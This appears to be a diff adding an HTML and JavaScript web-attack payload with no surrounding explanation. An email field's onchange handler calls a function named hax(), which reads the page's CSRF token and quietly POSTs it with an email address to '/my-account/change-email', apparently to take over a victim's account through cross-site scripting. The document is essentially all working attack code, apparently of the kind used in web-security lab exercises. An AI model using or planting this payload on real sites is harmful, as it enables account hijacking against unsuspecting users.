@@ -1,0 +1,17 @@
+<input type="text" name="username">
+<input type="email" name="email" onchange="hax()">
+
+<script>
+function hax() {
+    var csrfToken = document.getElementsByName('csrf')[0].value;
+    var email= document.getElementsByName('email')[0].value;
+    var data = new FormData();
+    data.append('csrf',csrfToken);
+    data.append('email',email);
+    fetch('/my-account/change-email', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: data
+    });
+}
+</script>
